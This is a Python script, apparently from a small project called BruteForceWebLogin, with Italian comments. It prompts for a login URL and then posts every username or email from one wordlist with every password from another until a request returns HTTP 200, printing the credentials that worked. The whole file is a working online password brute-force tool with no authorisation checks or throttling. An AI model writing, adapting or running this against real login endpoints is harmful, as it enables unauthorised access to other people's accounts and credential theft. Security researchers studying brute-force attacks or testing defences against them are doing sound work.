import asyncio
import httpx
import aiofiles
from .Options import headers  # Presumendo che 'Options' contenga intestazioni necessarie
import os

async def try_login(client, url, data):
    """Effettua una richiesta di login e restituisce la risposta."""
    return await client.post(url, headers=headers, data=data)

async def load_file(filename):
    """Carica le righe di un file e restituisce una lista di stringhe."""
    try:
        async with aiofiles.open(filename, "r", encoding="latin-1") as file:
            lista = [line.strip() for line in await file.readlines()]
            return lista  # Restituisci la lista di password
    except FileNotFoundError:
        print(f"Errore: il file {filename} non esiste.")
        return []

async def attempt_login(client, url, identifier, password, is_email):
    """Tenta di effettuare il login con un identificatore e una password."""
    data = {"email" if is_email else "username": identifier, "password": password}
    response = await try_login(client, url, data)
    return response.status_code == 200

async def login_with_provided_credentials(client, url, identifier, password, is_email):
    """Effettua il login con le credenziali fornite dall'utente."""
    success = await attempt_login(client, url, identifier, password, is_email)
    if success:
        print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
    return success

async def login_with_file_credentials(client, url, identifier, passwords, is_email):
    """Effettua login con tutte le password da un file."""
    for password in passwords:
        success = await attempt_login(client, url, identifier, password, is_email)
        if success:
            print(f"Login riuscito con {'email' if is_email else 'username'}: {identifier} e password: {password}")
            return True
    return False

async def startCredBruteForce():
    # Specifica il percorso corretto del file
    filename = "./BruteForceWebLogin/usernames.txt"  # Cambia questo percorso se necessario
    if not os.path.isfile(filename):
        print(f"Il file {filename} non esiste nella directory corrente.")
        return
    """Funzione principale per gestire il login."""
    url = input("Inserisci l'URL/API di login: ")
    login_type = input("Vuoi effettuare il login con (1) Email o (2) Username? ")
    
    is_email = login_type == '1'
    identifier = input(f"Inserisci il {'tuo indirizzo email' if is_email else 'tuo username'}: ")
    has_password = input("Hai una password? (y/n): ").lower() == 'y'

    if has_password:
        password = input("Inserisci la tua password: ")
    else:
        passwords = await load_file("./BruteForceWebLogin/passwords.txt")
        if not passwords:
            print("Il file delle password è vuoto.")
            return

    async with httpx.AsyncClient() as client:
        if has_password:
            await login_with_provided_credentials(client, url, identifier, password, is_email)
        else:
            if is_email:
                emails = await load_file("./BruteForceWebLogin/mail.txt")
                for email in emails:
                    if await login_with_file_credentials(client, url, email, passwords, True):
                        return
            else:
                usernames = await load_file("./BruteForceWebLogin/usernames.txt")
                for username in usernames:
                    if await login_with_file_credentials(client, url, username, passwords, False):
                        return

